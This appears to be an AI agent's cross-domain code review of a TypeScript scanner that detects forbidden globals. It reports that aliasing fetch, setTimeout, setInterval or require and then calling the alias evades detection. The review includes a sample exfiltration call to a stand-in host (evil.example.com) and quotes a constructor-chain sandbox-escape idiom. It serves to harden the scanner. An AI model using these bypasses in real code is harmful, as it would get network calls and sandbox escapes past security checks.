# Cross-Domain Review — kernel-purity-ast-hardening (Ra)

**Scope:** `git diff master...feat/kernel-purity-ast-hardening` (HEAD `d227090`). Issue #63 durable half: AST-based hardening layer (`scanForbiddenGlobalsAst`) added additively alongside the existing regex layer in `src/qa/kernel-purity-check.ts`. Tier: STANDARD (per STATE.md/CHANGELOG; see Finding 2 on whether this is actually backed in `docs/run-log.jsonl`).

**ADR cache:** `ADR cache HIT: reused 35 ADR(s) [adr/devops:12, adr/software-engineering:23] from catalog (fp 83b2e3e) [CACHE=HIT]` — whole catalog read, unfiltered, per this role's standing charter (PRINCIPLES rule 9).

**Who else is reviewing:** `docs/.maat-state.json`'s top-level `scope`/`tier` fields are stale (still `friendly-halt-messages`/CRITICAL, the previous story; no state transition has happened yet for `kernel-purity-ast-hardening`). No domain-reviewer report exists yet in `docs/reviews/` for this scope. Per STATE.md's own resume note, the plan is STANDARD tier: one domain reviewer plus cross-domain-reviewer, likely `app-security-reviewer` given this exact file's own precedent, but that reviewer had not yet filed a report at the time of this pass. Findings below are reported on their own merits, not assumed-covered by an absent report.

## Cross-domain ADR verdict (whole catalog)

- **Devops ADRs (0001-0010):** no collision. Diff touches only `src/qa/kernel-purity-check.ts`, its test file, 8 new fixture `.ts` files, `CHANGELOG.md`, `docs/STATE.md`. Zero infra/IaC/CDK/pipeline/tagging/cost files touched (`git diff --stat` confirmed). N/A, clean.
- **SE ADR-0002 (multi-layer architecture):** N/A. `src/qa/` is a QA instrument outside the domain/application/infra layering this ADR governs.
- **SE ADR-0003 (SOLID / function size):** clean, code-traced. Every new function (`unwrapCasts`, `resolveExpressionRoot`, `foldStringConcat`, `recordDestructureViolations`, `collectAliasFromDeclaration`, `collectAliasFromAssignment`, `collectAliases`, `detectPropertyAccessViolation`, `detectElementAccessViolation`, `detectUsages`, `scanForbiddenGlobalsAst`) is under 20 lines, single-purpose, no I/O injected into logic.
- **SE ADR-0005 (testing strategy, at least 80% line coverage):** clean, demonstrated. Ran `node --test --experimental-test-coverage src/qa/kernel-purity-check.test.ts` live: 43/43 pass, `kernel-purity-check.ts` line coverage 97.87%, branch 94.51% — comfortably clears the ADR-0005 floor. Matches the build receipt's claim.
- **SE ADR-0010 (new third-party dependency justification):** clean, code-traced. `typescript` was already a `^5.7.3` devDependency (used for `tsc --noEmit`); this is its first runtime import, inside a dev-time QA script (not shipped app code), resolved via `npm ci` in CI. No `package.json` diff. No new-dependency justification paragraph was needed because no new dependency was added.
- **SE ADR-0016/0018/0019/0020 (porting/self-protection ADRs):** N/A. No ported file, no `.claude-plugin/`, `guard.mjs`, or M1.5 file touched.
- **SE ADR-0021 (thoth-native architecture, POL-11):** this diff is the structural test ADR-0021 requires ("the layer boundary is enforced by a lint rule or structural test, not by convention alone"). See Finding 1: the enforcement has a real, demonstrated coverage hole against exactly the categories (network/timer/process-spawning) this rule names.

## Seam findings

### Finding 1 — [ISSUE][HIGH][demonstrated] — alias-then-CALL bypass, undetected for exactly the 4 roots the Q1 ruling added

`src/qa/kernel-purity-check.ts:196-218` (`detectUsages`) only walks `ts.PropertyAccessExpression` and `ts.ElementAccessExpression`. A forbidden root aliased to a local variable and then called directly, with no `.prop`/`[key]` access on the alias itself, is invisible to the AST layer. The regex layer (`FORBIDDEN_GLOBAL_PATTERNS`, lines 79-102) requires immediate call syntax (`fetch\s*\(`, `setTimeout\s*\(`, `setInterval\s*\(`, `require\s*\(`) for exactly these four roots, so it never fires on the alias-declaration line either — unlike `globalThis`/`global`/`Reflect`/`eval`/`Function`, which are unconditional bare-word patterns that DO fire on their own alias-declaration line (e.g. `const e = eval;`).

This is precisely the seam between the Manager's Q1 ruling ("extend the AST layer's alias/reassignment-tracking set to fetch/setTimeout/setInterval/require ... because it maps directly onto ADR-0021 POL-11's own named forbidden categories (network, timer, process-spawning) at near-zero marginal cost" — STATE.md line 15) and what the shipped code actually delivers: for these four roots, the dominant, near-exclusive real invocation shape IS a direct call (`fetch(url)`, `setTimeout(cb, ms)`, `setInterval(cb, ms)`, `require(id)`) — property/element access on them (`.bind`, `.name`, `.resolve`, as the story's own `aliased-network-timer.ts` fixture tests) is the unrealistic case. The story's own test at `kernel-purity-check.test.ts:180-183` already proves this gap exists and labels it a disclosed residual "same footing as the regex layer's own literal-text limits" — that framing understates it: for `globalThis`/`global`/`Reflect`/`eval`/`Function` the residual is narrow (the regex layer's unconditional word-match still catches the alias line), but for `fetch`/`setTimeout`/`setInterval`/`require` — the four roots this story's Q1 ruling specifically added to close ADR-0021's network/timer/process-spawning categories — the residual IS the primary attack surface, effectively nullifying the ruling's stated purpose for those four roots.

**Live demonstration** (ran directly against the shipped functions via a temporary script placed at `src/qa/__ra_gap_check_tmp.ts` and deleted immediately after, never committed):

```
=== fetch-alias-call ===
source: const f = fetch; f("https://evil.example.com/exfil");
regex layer findings: []
AST layer findings:   []

=== setTimeout-alias-call ===   regex: []   AST: []
=== setInterval-alias-call ===  regex: []   AST: []
=== require-alias-call ===      regex: []   AST: []

=== eval-alias-call (control) ===
source: const e = eval; e("1+1");
regex layer findings: [eval]     <- caught, by the regex layer's unconditional bare-word match
AST layer findings:   []
```

4/4 alias-then-call samples for the Q1-added roots pass through both layers with zero detections; the `eval` control confirms the asymmetry is real, not a fluke of the test harness.

**Exposure:** 4 of 9 tracked forbidden roots (44%) — exactly the categories the Q1 ruling added — have no effective coverage against their dominant real invocation pattern. Basis: measured (ran the shipped scanner against 5 hand-built but representative samples; 4/4 bypass, 1/1 control caught).

**Minimal fix:** in `detectUsages`, also handle `ts.isCallExpression(node)` where `node.expression` is an identifier resolving to a forbidden root via `resolveExpressionRoot` — flag it the same way property/element access is flagged. Same shape as the two branches already there; no new pass, no new data structure.

**Why this isn't noise:** no domain-reviewer report exists yet for this scope, and this specific claim — whether the Q1 ruling's stated rationale actually holds for the code shipped — sits at the seam between the Manager's own scoping decision and ADR-0021's enforcement-completeness requirement, which is this role's charter to check.

### Finding 2 — [ISSUE][MED][code-traced] — the story's own "small-story convention" substitute for a docs/decisions.md row is unbacked

`docs/STATE.md` (lines 4, 13) and `CHANGELOG.md` both assert: "STANDARD tier ratified (`docs/run-log.jsonl` tier-ratified event, scope `kernel-purity-ast-hardening`)". This is the exact artifact CLAUDE.md's small-story convention relies on to substitute for a `docs/decisions.md` row, per the `friendly-halt-messages` precedent this story explicitly follows.

`grep -n "kernel-purity-ast-hardening" docs/run-log.jsonl` (42 lines total, also tried `kernel-purity` and `63` broadly) returns zero matches for this scope. The most recent `tier-ratified` event in the file is for scope `friendly-halt-messages`, dated `2026-09-17T23:56:01Z` — the previous story. `docs/.maat-state.json`'s top-level `scope`/`tier` fields are also still `friendly-halt-messages`/`CRITICAL` — the state transition to this story's own STANDARD-tier ratification has not happened.

This directly answers the question this review was asked to check: no, the small-story convention does not actually cover this story as things stand — the artifact it depends on to substitute for a `docs/decisions.md` row was never written. The claim in STATE.md/CHANGELOG is a governance/audit-trail claim that does not match the committed state of the repo.

**Exposure:** 100% of this story's tier-ratification audit trail is currently unbacked; if `/maat:verify` or a future session reads `docs/.maat-state.json` to reuse rather than re-derive the tier (per CLAUDE.md), it would pick up the stale CRITICAL/`friendly-halt-messages` scope, not this story's STANDARD ratification. Basis: measured (grepped the full run-log and the full state file).

**Minimal fix:** append the missing tier-ratified line to `docs/run-log.jsonl` for scope `kernel-purity-ast-hardening` (proposed STANDARD, ratified STANDARD), and transition `docs/.maat-state.json`'s scope block to `kernel-purity-ast-hardening`, pushing the current block into `priorScope` — matching every prior transition's own shape — before `/maat:verify` runs.

## Coverage gaps named

- **CHANGELOG.md / docs/STATE.md prose edits:** not independently re-verified line-by-line beyond the specific claims checked above (coverage percentage, dependency, run-log event). Low-risk documentation; proportional to skip a full prose audit here, not a silent gap.
- **The 8 new fixture files:** covered by the domain reviewer's normal test-quality lane (are they well-named, non-overlapping, exercising real code paths); not re-litigated here beyond confirming they exist and the suite is green.
- No infra-domain surface exists in this diff to leave uncovered — confirmed, not assumed.

## Verdict

**REWORK.** Finding 1 is HIGH plus demonstrated, which per the evidence policy requires a non-clean verdict. It is a real, live, reproducible bypass of the exact security categories (network/timer/process-spawning) this story's own Q1 ruling exists to close, inside a CLAUDE.md-adjacent sensitive-area enforcement mechanism for ADR-0021 POL-11. The fix is small and same-shaped as code already in the diff.

**Single next action:** `story-implementer` adds `ts.isCallExpression` handling to `detectUsages` (Finding 1), appends the missing `tier-ratified` run-log event and transitions `.maat-state.json`'s scope block (Finding 2), re-runs the full suite plus coverage, and requests a fresh cross-domain and domain-reviewer pass on the delta only.

---

RECEIPT: verdict=REWORK
findings (ALL of them, one terse line each, ranked by blast radius):
1. [ISSUE][HIGH][demonstrated] src/qa/kernel-purity-check.ts:196-218 detectUsages -- alias-then-call on fetch/setTimeout/setInterval/require (the 4 roots the Q1 ruling added) is undetected by both layers, live-demonstrated 4/4 bypass vs 1/1 eval-control caught; add ts.isCallExpression handling to detectUsages, same shape as existing property/element-access branches.
2. [ISSUE][MED][code-traced] docs/STATE.md:4,13 + CHANGELOG.md claim a docs/run-log.jsonl tier-ratified event for scope kernel-purity-ast-hardening that does not exist (grepped all 42 lines, zero matches); docs/.maat-state.json's top-level scope/tier also still stale at the prior story -- the small-story convention substituting for a decisions.md row is unbacked; append the missing run-log event and transition .maat-state.json's scope block.
3. [CLEAN][code-traced] No devops-ADR collision -- zero infra/IaC files touched in this diff.
4. [CLEAN][code-traced] SE ADR-0003 function size/complexity -- every new function under 20 lines, single-purpose.
5. [CLEAN][demonstrated] SE ADR-0005 coverage claim verified -- live run: 43/43 tests pass, kernel-purity-check.ts 97.87% line / 94.51% branch coverage, clears the 80% floor.
6. [CLEAN][code-traced] SE ADR-0010 dependency justification -- typescript already a devDependency, no package.json change, no new-dependency paragraph needed.
7. [CLEAN][code-traced] SE ADR-0016/0018/0019/0020 porting/self-protection ADRs -- N/A, no ported file or plugin-tree file touched.
counts (a CHECKSUM -- MUST equal the lines listed above; never truncated): issues=2 suspicions=0 clean=5
evidence (a CHECKSUM over the tags above -- MUST equal them, and MUST total the counts line): demonstrated=2 code-traced=5 derived=0
checks=node --test --experimental-test-coverage src/qa/kernel-purity-check.test.ts: 43 pass, 0 fail, 0 skipped, 97.87% line / 94.51% branch coverage on kernel-purity-check.ts; live gap-check script: 4/4 alias-call bypass confirmed undetected, 1/1 eval control caught by regex layer
adr=HIT(35, whole catalog)
report=docs/reviews/kernel-purity-ast-hardening-cross-domain-2026-09-17.md

---

**Addendum (same session, appended not edited per PRINCIPLES rule 11):** while checking `git status` at close, two untracked, uncommitted probe scripts were observed in the working tree, not authored by this pass: `src/qa/adv-probe-temp.ts` and `src/qa/adv-probe-temp2.ts`. They read as an adversarial probe against this same diff (a `probe()` harness calling `scanForbiddenGlobalsAst`/`scanForbiddenGlobals` directly), consistent with a concurrent `red-team` session sharing this checkout. Their probe #1 is labeled "bare call through alias (already disclosed)" — the same shape as this report's Finding 1 — and they additionally probe a more severe, unrelated bypass class this report did not test: `({}).constructor.constructor("return this")()`, the classic sandbox-escape idiom that reaches `globalThis`/`Function` without ever writing any of the 9 tracked identifiers as literal text, anywhere, even in a string. Neither script's output nor any red-team report was available to read at the time of this pass (no report exists yet in `docs/reviews/` for this scope). This is disclosed for the Manager's awareness only — it does not change this report's own Finding 1 (independently demonstrated above, on its own evidence) or verdict, and these files were left untouched (not mine to alter or clean up).
